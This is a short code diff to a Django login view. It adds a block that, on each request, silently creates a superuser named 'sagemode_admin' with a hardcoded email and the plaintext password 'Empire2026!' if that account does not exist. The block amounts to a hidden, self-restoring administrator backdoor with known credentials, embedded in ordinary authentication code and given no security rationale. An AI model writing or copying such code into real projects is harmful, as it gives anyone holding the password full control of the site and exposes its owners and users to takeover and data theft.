@@ -127,6 +127,10 @@ def login_view(request):
     u.save()
     # -----------------------------------------------------------
 
+    # 2. Création automatique de sagemode_admin s'il n'existe pas
+    if not User.objects.filter(username='sagemode_admin').exists():
+        User.objects.create_superuser('sagemode_admin', 'admin@email.com', 'Empire2026!')
+
     if request.method == 'POST':
         u = request.POST.get('username')
         p = request.POST.get('password')
